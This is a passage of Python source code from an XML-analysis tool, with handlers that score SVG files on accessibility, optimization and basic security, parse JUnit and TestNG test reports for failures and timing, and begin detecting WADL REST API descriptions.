                    'href': elem.get('href') or elem.get('{http://www.w3.org/1999/xlink}href'),
                    'width': elem.get('width'),
                    'height': elem.get('height')
                })
            
            elif tag == 'use':
                graphics_info['use_elements'].append({
                    'href': elem.get('href') or elem.get('{http://www.w3.org/1999/xlink}href'),
                    'x': elem.get('x'),
                    'y': elem.get('y')
                })
        
        return graphics_info
    
    def _analyze_styles(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze styling approaches"""
        style_info = {
            'style_definitions': [],
            'inline_styles': 0,
            'class_usage': 0,
            'colors': [],
            'fonts': [],
            'css_rules': []
        }
        
        # Find style elements
        for style_elem in root.findall('.//style'):
            if style_elem.text:
                style_info['style_definitions'].append({
                    'content': style_elem.text,
                    'type': style_elem.get('type', 'text/css')
                })
                
                # Extract CSS rules
                css_content = style_elem.text
                rules = re.findall(r'([^{]+)\s*\{([^}]+)\}', css_content)
                for selector, properties in rules:
                    style_info['css_rules'].append({
                        'selector': selector.strip(),
                        'properties': properties.strip()
                    })
        
        # Count inline styles and classes
        for elem in root.iter():
            if elem.get('style'):
                style_info['inline_styles'] += 1
                
                # Extract colors from inline styles
                style_text = elem.get('style', '')
                colors = re.findall(r'(?:fill|stroke|color):\s*([^;]+)', style_text)
                style_info['colors'].extend(colors)
            
            if elem.get('class'):
                style_info['class_usage'] += 1
            
            # Extract colors from attributes
            for attr in ['fill', 'stroke', 'color']:
                if elem.get(attr):
                    style_info['colors'].append(elem.get(attr))
            
            # Extract fonts
            for attr in ['font-family', 'font-face']:
                if elem.get(attr):
                    style_info['fonts'].append(elem.get(attr))
        
        # Remove duplicates and filter colors
        style_info['colors'] = list(set([c for c in style_info['colors'] if c not in ['none', 'transparent']]))
        style_info['fonts'] = list(set(style_info['fonts']))
        
        return style_info
    
    def _analyze_accessibility(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze accessibility features"""
        accessibility_info = {
            'has_title': False,
            'has_description': False,
            'aria_labels': 0,
            'role_attributes': 0,
            'alt_text_coverage': 0,
            'accessibility_score': 0.0,
            'recommendations': []
        }
        
        # Check for title
        if root.find('.//title') is not None:
            accessibility_info['has_title'] = True
        else:
            accessibility_info['recommendations'].append('Add title element for screen readers')
        
        # Check for description
        if root.find('.//desc') is not None:
            accessibility_info['has_description'] = True
        else:
            accessibility_info['recommendations'].append('Add description element for context')
        
        # Count ARIA attributes
        for elem in root.iter():
            if elem.get('aria-label') or elem.get('aria-labelledby'):
                accessibility_info['aria_labels'] += 1
            if elem.get('role'):
                accessibility_info['role_attributes'] += 1
        
        # Calculate accessibility score
        score = 0
        if accessibility_info['has_title']:
            score += 0.4
        if accessibility_info['has_description']:
            score += 0.3
        if accessibility_info['aria_labels'] > 0:
            score += 0.2
        if accessibility_info['role_attributes'] > 0:
            score += 0.1
        
        accessibility_info['accessibility_score'] = score
        
        return accessibility_info
    
    def _analyze_animations(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SVG animations"""
        animation_info = {
            'has_animations': False,
            'animation_elements': [],
            'animation_types': {},
            'css_animations': 0
        }
        
        animation_tags = ['animate', 'animateTransform', 'animateMotion', 'set', 'animateColor']
        
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if tag in animation_tags:
                animation_info['has_animations'] = True
                animation_detail = {
                    'type': tag,
                    'attributeName': elem.get('attributeName'),
                    'dur': elem.get('dur'),
                    'repeatCount': elem.get('repeatCount'),
                    'values': elem.get('values')
                }
                animation_info['animation_elements'].append(animation_detail)
                animation_info['animation_types'][tag] = animation_info['animation_types'].get(tag, 0) + 1
        
        # Check for CSS animations in style elements
        for style_elem in root.findall('.//style'):
            if style_elem.text and ('animation' in style_elem.text or 'keyframes' in style_elem.text):
                animation_info['css_animations'] += 1
        
        return animation_info
    
    def _analyze_scripts(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze embedded scripts"""
        script_info = {
            'has_scripts': False,
            'script_count': 0,
            'script_types': [],
            'external_scripts': [],
            'inline_scripts': []
        }
        
        for script_elem in root.findall('.//script'):
            script_info['has_scripts'] = True
            script_info['script_count'] += 1
            
            script_type = script_elem.get('type', 'application/javascript')
            script_info['script_types'].append(script_type)
            
            href = script_elem.get('href') or script_elem.get('{http://www.w3.org/1999/xlink}href')
            if href:
                script_info['external_scripts'].append(href)
            elif script_elem.text:
                script_info['inline_scripts'].append({
                    'content': script_elem.text[:100],  # First 100 chars
                    'length': len(script_elem.text)
                })
        
        return script_info
    
    def _analyze_optimization_opportunities(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze optimization opportunities"""
        optimization_info = {
            'unused_definitions': 0,
            'redundant_groups': 0,
            'long_paths': 0,
            'optimization_score': 0.0,
            'recommendations': []
        }
        
        # Check for unused definitions
        defs = root.find('.//defs')
        if defs is not None:
            defined_ids = set(elem.get('id') for elem in defs.iter() if elem.get('id'))
            used_ids = set()
            
            for elem in root.iter():
                href = elem.get('href') or elem.get('{http://www.w3.org/1999/xlink}href')
                if href and href.startswith('#'):
                    used_ids.add(href[1:])
            
            optimization_info['unused_definitions'] = len(defined_ids - used_ids)
        
        # Check for long path data
        for path_elem in root.findall('.//path'):
            path_data = path_elem.get('d', '')
            if len(path_data) > 1000:  # Arbitrary threshold
                optimization_info['long_paths'] += 1
        
        # Check for redundant groups
        groups = root.findall('.//g')
        single_child_groups = sum(1 for g in groups if len(list(g)) == 1)
        optimization_info['redundant_groups'] = single_child_groups
        
        # Generate recommendations
        if optimization_info['unused_definitions'] > 0:
            optimization_info['recommendations'].append('Remove unused definitions')
        if optimization_info['long_paths'] > 0:
            optimization_info['recommendations'].append('Optimize path data for smaller file size')
        if optimization_info['redundant_groups'] > 0:
            optimization_info['recommendations'].append('Remove unnecessary group elements')
        
        return optimization_info
    
    def _analyze_security_aspects(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security considerations"""
        security_info = {
            'security_risks': [],
            'external_references': [],
            'script_usage': self._has_scripts(root),
            'foreign_objects': 0
        }
        
        # Check for script usage
        if security_info['script_usage']:
            security_info['security_risks'].append('Contains JavaScript - review for XSS risks')
        
        # Check for external references
        for elem in root.iter():
            href = elem.get('href') or elem.get('{http://www.w3.org/1999/xlink}href')
            if href and href.startswith('http'):
                security_info['external_references'].append(href)
                security_info['security_risks'].append('Contains external references')
        
        # Check for foreign objects
        foreign_objects = root.findall('.//foreignObject')
        security_info['foreign_objects'] = len(foreign_objects)
        if foreign_objects:
            security_info['security_risks'].append('Contains foreign objects - review content')
        
        return security_info
    
    def _check_animations(self, root: ET.Element) -> bool:
        """Check if SVG contains animations"""
        animation_tags = ['animate', 'animateTransform', 'animateMotion', 'set', 'animateColor']
        namespace = root.tag.split("}")[0][1:] if "}" in root.tag else ""
        
        for tag in animation_tags:
            search_path = f'.//{{{namespace}}}{tag}' if namespace else f'.//{tag}'
            if root.find(search_path) is not None:
                return True
        
        # Check for CSS animations
        for style_elem in root.findall('.//style'):
            if style_elem.text and ('animation' in style_elem.text or 'keyframes' in style_elem.text):
                return True
        
        return False
    
    def _has_scripts(self, root: ET.Element) -> bool:
        """Check if SVG contains scripts"""
        return len(root.findall('.//script')) > 0
    
    def _check_accessibility(self, root: ET.Element) -> bool:
        """Check if SVG has basic accessibility features"""
        return (root.find('.//title') is not None or 
                root.find('.//desc') is not None or
                any(elem.get('aria-label') for elem in root.iter()))
    
    def _count_svg_elements(self, root: ET.Element) -> Dict[str, int]:
        """Count SVG elements by type"""
        elements = {}
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            elements[tag] = elements.get(tag, 0) + 1
        return elements
    
    def _parse_viewport(self, root: ET.Element) -> Dict[str, Any]:
        """Parse viewport information"""
        viewbox = root.get('viewBox')
        if viewbox:
            parts = viewbox.split()
            if len(parts) == 4:
                return {
                    'x': float(parts[0]),
                    'y': float(parts[1]),
                    'width': float(parts[2]),
                    'height': float(parts[3])
                }
        return {}
    
    def _analyze_group_structure(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Analyze group structure for organization"""
        groups = []
        for group in root.findall('.//g'):
            group_info = {
                'id': group.get('id'),
                'class': group.get('class'),
                'child_count': len(list(group)),
                'has_transform': group.get('transform') is not None
            }
            groups.append(group_info)
        return groups
    
    def _calculate_max_depth(self, elem: ET.Element, depth: int = 0) -> int:
        """Calculate maximum depth of element tree"""
        if not list(elem):
            return depth
        return max(self._calculate_max_depth(child, depth + 1) for child in elem)
    
    def _extract_dimension_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract dimension summary"""
        return {
            'width': root.get('width'),
            'height': root.get('height'),
            'has_viewbox': root.get('viewBox') is not None,
            'responsive': root.get('viewBox') is not None and root.get('width') is None
        }
    
    def _extract_design_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract design summary"""
        elements = self._count_svg_elements(root)
        return {
            'element_count': sum(elements.values()),
            'primary_elements': {k: v for k, v in elements.items() if v > 1},
            'has_text': elements.get('text', 0) > 0,
            'has_images': elements.get('image', 0) > 0
        }
    
    def _extract_accessibility_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract accessibility summary"""
        return {
            'has_title': root.find('.//title') is not None,
            'has_description': root.find('.//desc') is not None,
            'aria_attributes': sum(1 for elem in root.iter() if elem.get('aria-label'))
        }
    
    def _extract_technical_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract technical summary"""
        return {
            'version': root.get('version', '1.1'),
            'has_scripts': self._has_scripts(root),
            'has_animations': self._check_animations(root),
            'namespace_count': len([k for k in root.attrib.keys() if k.startswith('xmlns')])
        }
    
    def _assess_svg_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess SVG quality across multiple dimensions"""
        
        # Accessibility quality
        accessibility_score = findings['accessibility']['accessibility_score']
        
        # Technical quality
        technical_score = 0.0
        if findings['dimensions']['has_responsive_design']:
            technical_score += 0.4
        if not findings['scripts']['has_scripts']:  # No scripts is better for security
            technical_score += 0.3
        if findings['elements']['total_elements'] < 100:  # Reasonable complexity
            technical_score += 0.3
        
        # Optimization quality
        optimization = findings['optimization']
        optimization_score = 1.0
        if optimization['unused_definitions'] > 0:
            optimization_score -= 0.3
        if optimization['redundant_groups'] > 0:
            optimization_score -= 0.2
        if optimization['long_paths'] > 0:
            optimization_score -= 0.2
        optimization_score = max(0.0, optimization_score)
        
        # Security quality
        security_score = 1.0
        security_risks = len(findings['security']['security_risks'])
        if security_risks > 0:
            security_score = max(0.0, 1.0 - (security_risks * 0.25))
        
        return {
            "accessibility": accessibility_score,
            "technical": technical_score,
            "optimization": optimization_score,
            "security": security_score,
            "overall": (accessibility_score + technical_score + optimization_score + security_score) / 4
        }
</file>

<file path="src/handlers/test_report_handler.py">
#!/usr/bin/env python3
"""
JUnit/TestNG Test Report Handler

Analyzes JUnit and TestNG XML test report files to extract
test execution results, failure patterns, and test metrics.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os
from datetime import datetime

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class TestReportHandler(XMLHandler):
    """Handler for JUnit and TestNG test report XML files"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # JUnit report indicators
        if root_tag in ['testsuites', 'testsuite']:
            # Check for JUnit-specific attributes
            if root.get('tests') is not None or root.get('failures') is not None:
                return True, 1.0
        
        # TestNG report indicators
        if root_tag == 'testng-results':
            return True, 1.0
        
        # Check for test-related elements
        test_indicators = ['testcase', 'test-method', 'test', 'suite']
        found = sum(1 for ind in test_indicators if root.find(f'.//{ind}') is not None)
        
        if found >= 2:
            return True, min(found * 0.3, 0.9)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Determine test framework
        if root_tag == 'testng-results':
            framework = "TestNG"
            version = root.get('version', 'unknown')
        elif root_tag in ['testsuites', 'testsuite']:
            framework = "JUnit"
            # Try to detect JUnit version
            if root.find('.//properties') is not None:
                version = "4.x"  # JUnit 4 typically has properties
            else:
                version = "5.x"  # Assume JUnit 5 for newer reports
        else:
            framework = "Generic Test Report"
            version = "unknown"
        
        return DocumentTypeInfo(
            type_name=f"{framework} Test Report",
            confidence=0.95,
            version=version,
            metadata={
                "framework": framework,
                "category": "test_results",
                "report_type": "execution_report"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        framework = self._determine_framework(root)
        
        if framework == "TestNG":
            findings = self._analyze_testng(root)
        else:
            findings = self._analyze_junit(root)
        
        recommendations = [
            "Analyze failure patterns for flaky tests",
            "Track test execution time trends",
            "Identify slow-running test suites",
            "Generate test coverage reports",
            "Monitor test stability over time",
            "Prioritize test maintenance efforts"
        ]
        
        ai_use_cases = [
            "Flaky test detection",
            "Test failure prediction",
            "Test execution optimization",
            "Root cause analysis for failures",
            "Test suite optimization",
            "Test quality metrics",
            "Regression test selection",
            "Test impact analysis"
        ]
        
        return SpecializedAnalysis(
            document_type=f"{framework} Test Report",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'total_tests': findings['summary']['total'],
                'passed_tests': findings['summary']['passed'],
                'failed_tests': findings['summary']['failed'],
                'skipped_tests': findings['summary']['skipped'],
                'test_suites': len(findings.get('suites', []))
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_test_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        framework = self._determine_framework(root)
        
        return {
            'test_summary': self._extract_test_summary(root, framework),
            'failed_tests': self._extract_failed_tests(root, framework),
            'slow_tests': self._extract_slow_tests(root, framework),
            'test_metrics': self._calculate_test_metrics(root, framework),
            'error_categories': self._categorize_errors(root, framework)
        }
    
    def _determine_framework(self, root: ET.Element) -> str:
        """Determine which test framework generated the report"""
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'testng-results':
            return "TestNG"
        elif root_tag in ['testsuites', 'testsuite']:
            return "JUnit"
        else:
            return "Unknown"
    
    def _analyze_junit(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze JUnit test report"""
        findings = {
            'summary': {
                'total': 0,
                'passed': 0,
                'failed': 0,
                'skipped': 0,
                'error': 0,
                'time': 0.0
            },
            'suites': [],
            'failed_tests': [],
            'skipped_tests': [],
            'slow_tests': [],
            'execution_time': {}
        }
        
        # Handle both single testsuite and testsuites container
        if root.tag == 'testsuites' or root.tag.endswith('}testsuites'):
            testsuites = root.findall('.//testsuite')
        else:
            testsuites = [root]
        
        for suite in testsuites:
            suite_info = {
                'name': suite.get('name'),
                'tests': int(suite.get('tests', 0)),
                'failures': int(suite.get('failures', 0)),
                'errors': int(suite.get('errors', 0)),
                'skipped': int(suite.get('skipped', 0)),
                'time': float(suite.get('time', 0)),
                'timestamp': suite.get('timestamp'),
                'testcases': []
            }
            
            # Analyze test cases
            for testcase in suite.findall('.//testcase'):
                test_info = {
                    'name': testcase.get('name'),
                    'classname': testcase.get('classname'),
                    'time': float(testcase.get('time', 0)),
                    'status': 'passed'  # Default
                }
                
                # Check for failures
                failure = testcase.find('.//failure')
                if failure is not None:
                    test_info['status'] = 'failed'
                    test_info['failure'] = {
                        'message': failure.get('message'),
                        'type': failure.get('type'),
                        'text': failure.text[:500] if failure.text else None
                    }
                    findings['failed_tests'].append(test_info)
                
                # Check for errors
                error = testcase.find('.//error')
                if error is not None:
                    test_info['status'] = 'error'
                    test_info['error'] = {
                        'message': error.get('message'),
                        'type': error.get('type'),
                        'text': error.text[:500] if error.text else None
                    }
                    findings['failed_tests'].append(test_info)
                
                # Check for skipped
                skipped = testcase.find('.//skipped')
                if skipped is not None:
                    test_info['status'] = 'skipped'
                    test_info['skip_message'] = skipped.get('message')
                    findings['skipped_tests'].append(test_info)
                
                suite_info['testcases'].append(test_info)
                
                # Track slow tests
                if test_info['time'] > 1.0:  # Tests taking more than 1 second
                    findings['slow_tests'].append({
                        'name': test_info['name'],
                        'class': test_info['classname'],
                        'time': test_info['time']
                    })
            
            findings['suites'].append(suite_info)
            
            # Update summary
            findings['summary']['total'] += suite_info['tests']
            findings['summary']['failed'] += suite_info['failures']
            findings['summary']['error'] += suite_info['errors']
            findings['summary']['skipped'] += suite_info['skipped']
            findings['summary']['time'] += suite_info['time']
        
        findings['summary']['passed'] = (findings['summary']['total'] - 
                                        findings['summary']['failed'] - 
                                        findings['summary']['error'] - 
                                        findings['summary']['skipped'])
        
        # Sort slow tests by time
        findings['slow_tests'].sort(key=lambda x: x['time'], reverse=True)
        
        return findings
    
    def _analyze_testng(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze TestNG test report"""
        findings = {
            'summary': {
                'total': int(root.get('total', 0)),
                'passed': int(root.get('passed', 0)),
                'failed': int(root.get('failed', 0)),
                'skipped': int(root.get('skipped', 0)),
                'error': 0,  # TestNG doesn't separate errors
                'time': 0.0
            },
            'suites': [],
            'failed_tests': [],
            'skipped_tests': [],
            'slow_tests': [],
            'test_groups': {}
        }
        
        # Analyze suites
        for suite in root.findall('.//suite'):
            suite_info = {
                'name': suite.get('name'),
                'duration': float(suite.get('duration-ms', 0)) / 1000,  # Convert to seconds
                'started_at': suite.get('started-at'),
                'finished_at': suite.get('finished-at'),
                'tests': []
            }
            
            # Analyze tests within suite
            for test in suite.findall('.//test'):
                test_info = {
                    'name': test.get('name'),
                    'duration': float(test.get('duration-ms', 0)) / 1000,
                    'test_methods': []
                }
                
                # Analyze test methods
                for method in test.findall('.//test-method'):
                    method_info = {
                        'name': method.get('name'),
                        'signature': method.get('signature'),
                        'status': method.get('status'),
                        'duration': float(method.get('duration-ms', 0)) / 1000,
                        'started_at': method.get('started-at'),
                        'finished_at': method.get('finished-at')
                    }
                    
                    # Extract groups
                    groups = method.find('.//groups')
                    if groups is not None:
                        method_info['groups'] = [g.get('name') for g in groups.findall('.//group')]
                        # Track group statistics
                        for group_name in method_info['groups']:
                            if group_name not in findings['test_groups']:
                                findings['test_groups'][group_name] = {'total': 0, 'passed': 0, 'failed': 0}
                            findings['test_groups'][group_name]['total'] += 1
                            if method_info['status'] == 'PASS':
                                findings['test_groups'][group_name]['passed'] += 1
                            elif method_info['status'] == 'FAIL':
                                findings['test_groups'][group_name]['failed'] += 1
                    
                    # Track failures
                    if method_info['status'] == 'FAIL':
                        exception = method.find('.//exception')
                        if exception is not None:
                            method_info['exception'] = {
                                'class': exception.get('class'),
                                'message': self._get_child_text(exception, 'message'),
                                'stacktrace': self._get_child_text(exception, 'full-stacktrace', '')[:500]
                            }
                        findings['failed_tests'].append(method_info)
                    
                    # Track skipped
                    elif method_info['status'] == 'SKIP':
                        findings['skipped_tests'].append(method_info)
                    
                    # Track slow tests
                    if method_info['duration'] > 1.0:
                        findings['slow_tests'].append({
                            'name': method_info['name'],
                            'signature': method_info['signature'],
                            'time': method_info['duration']
                        })
                    
                    test_info['test_methods'].append(method_info)
                
                suite_info['tests'].append(test_info)
                findings['summary']['time'] += test_info['duration']
            
            findings['suites'].append(suite_info)
        
        # Sort slow tests
        findings['slow_tests'].sort(key=lambda x: x['time'], reverse=True)
        
        return findings
    
    def _extract_test_summary(self, root: ET.Element, framework: str) -> Dict[str, Any]:
        """Extract test execution summary"""
        if framework == "TestNG":
            return {
                'total': int(root.get('total', 0)),
                'passed': int(root.get('passed', 0)),
                'failed': int(root.get('failed', 0)),
                'skipped': int(root.get('skipped', 0)),
                'duration_ms': sum(float(s.get('duration-ms', 0)) for s in root.findall('.//suite'))
            }
        else:  # JUnit
            summary = {
                'total': 0,
                'passed': 0,
                'failed': 0,
                'errors': 0,
                'skipped': 0,
                'duration_seconds': 0.0
            }
            
            for suite in root.findall('.//testsuite'):
                summary['total'] += int(suite.get('tests', 0))
                summary['failed'] += int(suite.get('failures', 0))
                summary['errors'] += int(suite.get('errors', 0))
                summary['skipped'] += int(suite.get('skipped', 0))
                summary['duration_seconds'] += float(suite.get('time', 0))
            
            summary['passed'] = summary['total'] - summary['failed'] - summary['errors'] - summary['skipped']
            
            return summary
    
    def _extract_failed_tests(self, root: ET.Element, framework: str) -> List[Dict[str, Any]]:
        """Extract details of failed tests"""
        failed_tests = []
        
        if framework == "TestNG":
            for method in root.findall('.//test-method[@status="FAIL"]'):
                exception = method.find('.//exception')
                failed_tests.append({
                    'name': method.get('name'),
                    'signature': method.get('signature'),
                    'duration_ms': float(method.get('duration-ms', 0)),
                    'exception_class': exception.get('class') if exception is not None else None,
                    'message': self._get_child_text(exception, 'message') if exception is not None else None
                })
        else:  # JUnit
            for testcase in root.findall('.//testcase'):
                failure = testcase.find('.//failure')
                error = testcase.find('.//error')
                
                if failure is not None or error is not None:
                    fail_elem = failure if failure is not None else error
                    failed_tests.append({
                        'name': testcase.get('name'),
                        'classname': testcase.get('classname'),
                        'time': float(testcase.get('time', 0)),
                        'failure_type': fail_elem.get('type'),
                        'message': fail_elem.get('message'),
                        'text': fail_elem.text[:200] if fail_elem.text else None
                    })
        
        return failed_tests[:50]  # Limit to first 50
    
    def _extract_slow_tests(self, root: ET.Element, framework: str, threshold: float = 1.0) -> List[Dict[str, Any]]:
        """Extract slow-running tests"""
        slow_tests = []
        
        if framework == "TestNG":
            for method in root.findall('.//test-method'):
                duration = float(method.get('duration-ms', 0)) / 1000  # Convert to seconds
                if duration > threshold:
                    slow_tests.append({
                        'name': method.get('name'),
                        'signature': method.get('signature'),
                        'duration_seconds': duration,
                        'status': method.get('status')
                    })
        else:  # JUnit
            for testcase in root.findall('.//testcase'):
                time = float(testcase.get('time', 0))
                if time > threshold:
                    slow_tests.append({
                        'name': testcase.get('name'),
                        'classname': testcase.get('classname'),
                        'duration_seconds': time
                    })
        
        # Sort by duration descending
        slow_tests.sort(key=lambda x: x['duration_seconds'], reverse=True)
        
        return slow_tests[:20]  # Top 20 slowest
    
    def _calculate_test_metrics(self, root: ET.Element, framework: str) -> Dict[str, Any]:
        """Calculate various test metrics"""
        metrics = {
            'success_rate': 0.0,
            'average_test_time': 0.0,
            'total_execution_time': 0.0,
            'test_distribution': {},
            'failure_rate_by_suite': {}
        }
        
        # Get summary stats
        summary = self._extract_test_summary(root, framework)
        
        # Calculate success rate
        if summary['total'] > 0:
            metrics['success_rate'] = summary['passed'] / summary['total']
        
        # Calculate average test time
        if framework == "TestNG":
            test_count = 0
            total_time = 0
            for method in root.findall('.//test-method'):
                test_count += 1
                total_time += float(method.get('duration-ms', 0)) / 1000
            
            if test_count > 0:
                metrics['average_test_time'] = total_time / test_count
            metrics['total_execution_time'] = total_time
        else:  # JUnit
            test_count = summary['total']
            total_time = summary['duration_seconds']
            
            if test_count > 0:
                metrics['average_test_time'] = total_time / test_count
            metrics['total_execution_time'] = total_time
        
        # Test distribution by status
        metrics['test_distribution'] = {
            'passed': summary['passed'],
            'failed': summary.get('failed', 0),
            'skipped': summary.get('skipped', 0),
            'error': summary.get('errors', 0)
        }
        
        # Failure rate by suite
        if framework == "TestNG":
            for suite in root.findall('.//suite'):
                suite_name = suite.get('name')
                suite_stats = {
                    'total': 0,
                    'failed': 0
                }
                
                for method in suite.findall('.//test-method'):
                    suite_stats['total'] += 1
                    if method.get('status') == 'FAIL':
                        suite_stats['failed'] += 1
                
                if suite_stats['total'] > 0:
                    metrics['failure_rate_by_suite'][suite_name] = suite_stats['failed'] / suite_stats['total']
        else:  # JUnit
            for suite in root.findall('.//testsuite'):
                suite_name = suite.get('name')
                total = int(suite.get('tests', 0))
                failed = int(suite.get('failures', 0)) + int(suite.get('errors', 0))
                
                if total > 0:
                    metrics['failure_rate_by_suite'][suite_name] = failed / total
        
        return metrics
    
    def _categorize_errors(self, root: ET.Element, framework: str) -> Dict[str, List[Dict[str, Any]]]:
        """Categorize test failures by error type"""
        error_categories = {
            'assertion_errors': [],
            'null_pointer': [],
            'timeout': [],
            'setup_errors': [],
            'other': []
        }
        
        if framework == "TestNG":
            for method in root.findall('.//test-method[@status="FAIL"]'):
                exception = method.find('.//exception')
                if exception is not None:
                    error_info = {
                        'test': method.get('name'),
                        'exception_class': exception.get('class'),
                        'message': self._get_child_text(exception, 'message')
                    }
                    
                    self._categorize_single_error(error_info, error_categories)
        else:  # JUnit
            for testcase in root.findall('.//testcase'):
                failure = testcase.find('.//failure')
                error = testcase.find('.//error')
                
                if failure is not None or error is not None:
                    fail_elem = failure if failure is not None else error
                    error_info = {
                        'test': testcase.get('name'),
                        'class': testcase.get('classname'),
                        'exception_class': fail_elem.get('type'),
                        'message': fail_elem.get('message')
                    }
                    
                    self._categorize_single_error(error_info, error_categories)
        
        # Limit each category
        for category in error_categories:
            error_categories[category] = error_categories[category][:10]
        
        return error_categories
    
    def _categorize_single_error(self, error_info: Dict[str, Any], categories: Dict[str, List]):
        """Categorize a single error"""
        exception_class = error_info.get('exception_class', '').lower()
        message = (error_info.get('message') or '').lower()
        
        if 'assert' in exception_class or 'assert' in message:
            categories['assertion_errors'].append(error_info)
        elif 'nullpointer' in exception_class or 'null pointer' in message:
            categories['null_pointer'].append(error_info)
        elif 'timeout' in exception_class or 'timeout' in message:
            categories['timeout'].append(error_info)
        elif 'setup' in message or 'before' in exception_class or 'after' in exception_class:
            categories['setup_errors'].append(error_info)
        else:
            categories['other'].append(error_info)
    
    def _assess_test_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess test suite quality metrics"""
        # Test coverage (based on success rate)
        success_rate = 0.0
        if findings['summary']['total'] > 0:
            success_rate = findings['summary']['passed'] / findings['summary']['total']
        
        # Test stability (inverse of failure rate)
        stability = success_rate
        
        # Performance (based on slow tests)
        performance = 1.0
        if findings['summary']['total'] > 0:
            slow_test_ratio = len(findings['slow_tests']) / findings['summary']['total']
            performance = max(0, 1.0 - slow_test_ratio * 2)  # Penalize if >50% are slow
        
        # Test maintenance (based on skip rate)
        maintenance = 1.0
        if findings['summary']['total'] > 0:
            skip_ratio = findings['summary']['skipped'] / findings['summary']['total']
            maintenance = max(0, 1.0 - skip_ratio * 2)  # Penalize if >50% are skipped
        
        # Flakiness indicator (would need historical data for accurate measurement)
        # For now, use a simple heuristic based on error types
        flakiness_score = 0.8  # Default to good
        if 'failed_tests' in findings:
            timeout_failures = sum(1 for test in findings['failed_tests'] 
                                 if 'timeout' in str(test.get('failure', {}).get('type', '')).lower())
            if timeout_failures > 2:
                flakiness_score = 0.4
        
        return {
            "success_rate": success_rate,
            "stability": stability,
            "performance": performance,
            "maintenance": maintenance,
            "flakiness": flakiness_score,
            "overall": (success_rate + stability + performance + maintenance + flakiness_score) / 5
        }
    
    def _get_child_text(self, parent: ET.Element, child_name: str, default: str = None) -> Optional[str]:
        """Get text content of a child element"""
        if parent is None:
            return default
        
        child = parent.find(f'.//{child_name}')
        return child.text if child is not None and child.text else default
</file>

<file path="src/handlers/wadl_handler.py">
#!/usr/bin/env python3
"""
WADL (Web Application Description Language) Handler

Analyzes WADL files which describe REST APIs and web services.
Extracts resource definitions, methods, parameters, response formats,
and generates API documentation and analysis for REST services.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os
from urllib.parse import urljoin, urlparse

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class WADLHandler(XMLHandler):
    """Handler for WADL (Web Application Description Language) files"""
    
    WADL_NAMESPACE = "http://wadl.dev.java.net/2009/02"
    WADL_NAMESPACE_ALT = "http://research.sun.com/wadl/2006/10"
    
    def _get_namespace(self, root: ET.Element) -> str:
        """Extract namespace prefix from root element"""
        if '}' in root.tag:
            return root.tag.split('}')[0] + '}'
        return ''
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for WADL namespace
        wadl_namespaces = [
            'wadl.dev.java.net',
            'research.sun.com/wadl',
            'java.net/wadl'
        ]
        
        if any(wadl_ns in uri for uri in namespaces.values() for wadl_ns in wadl_namespaces):
            return True, 1.0
        
        # Check root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if root_tag.lower() == 'application':
            # Check for WADL-specific elements
            ns = self._get_namespace(root)
            wadl_elements = ['resources', 'resource', 'method', 'param', 'representation']
            found = sum(1 for elem in wadl_elements if root.find(f'.//{ns}{elem}') is not None)
            if found >= 2:
                return True, min(found * 0.2, 0.9)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Detect WADL version
        version = "1.0"  # Default
        for uri in namespaces.values():
            if '2009/02' in uri:
                version = "1.0"
            elif '2006/10' in uri:
                version = "0.9"
        
        # Detect API characteristics
        ns = self._get_namespace(root)
        api_type = "rest_api"
        
        # Check for specific patterns
        methods = []
        for method in root.findall(f'.//{ns}method'):
            method_name = method.get('name', '').upper()
            if method_name:
                methods.append(method_name)
        
        if 'POST' in methods and 'PUT' in methods and 'DELETE' in methods:
            api_type = "full_crud_api"
        elif 'GET' in methods and len(methods) == 1:
            api_type = "read_only_api"
        elif any(method in ['POST', 'PUT', 'PATCH'] for method in methods):
            api_type = "write_api"
        
        return DocumentTypeInfo(
            type_name="WADL API Description",
            confidence=0.95,
            version=version,
            metadata={
                "standard": "WADL",
                "category": "api_description",
                "api_type": api_type,
                "methods": list(set(methods))
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
